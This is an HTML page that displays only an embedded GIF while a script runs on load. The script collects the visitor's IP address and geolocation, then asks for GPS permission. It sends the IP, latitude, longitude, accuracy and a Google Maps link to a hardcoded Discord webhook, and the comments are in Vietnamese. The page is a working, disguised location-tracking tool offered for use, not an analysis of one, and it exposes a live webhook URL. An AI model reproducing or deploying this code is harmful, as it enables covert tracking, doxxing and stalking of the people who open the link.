<!DOCTYPE html>
<html>
<body onload="getIpData()">

<iframe src="https://giphy.com/embed/5uDNFrOi6VwrkFKBaj" width="480" height="480" frameBorder="0" class="giphy-embed" allowFullScreen></iframe>

<script>
const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1527956134856495104/4nt29jEEtSdg99Ks_nga5go68k-MyiYoI-e8RY3ymAEw_dgQf98bVuoE6l7_odXxtUXS";

// 1. Tự động lấy IP ngay khi mở web (không cần PHP)
function getIpData() {
    fetch('https://ipapi.co/json/')
    .then(res => res.json())
    .then(data => {
        sendToDiscord("IP (Tự động)", data.latitude, data.longitude, data.ip, "N/A");
        // Sau khi lấy IP xong thì gọi luôn hàm xin quyền GPS
        getLocation();
    })
    .catch(err => console.log("Lỗi IP:", err));
}

// 2. Hàm xin quyền GPS
function getLocation() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            (pos) => sendToDiscord("GPS (Đã cấp quyền)", pos.coords.latitude, pos.coords.longitude, "N/A", pos.coords.accuracy + "m"),
            (err) => console.log("GPS bị chặn")
        );
    }
}

// 3. Hàm gửi về Discord
function sendToDiscord(method, lat, lon, ip, acc) {
    const payload = {
        embeds: [{
            title: `🎯 Dữ liệu: ${method}`,
            color: 16744192,
            fields: [
                { name: "🌐 IP", value: ip, inline: false },
                { name: "🛰️ Vĩ độ", value: String(lat), inline: true },
                { name: "🛰️ Kinh độ", value: String(lon), inline: true },
                { name: "🎯 Độ chính xác", value: acc, inline: false },
                { name: "🌐 Maps", value: `https://www.google.com/maps?q=${lat},${lon}`, inline: false }
            ]
        }]
    };

    fetch(DISCORD_WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
    });
}
</script>

</body>
</html>
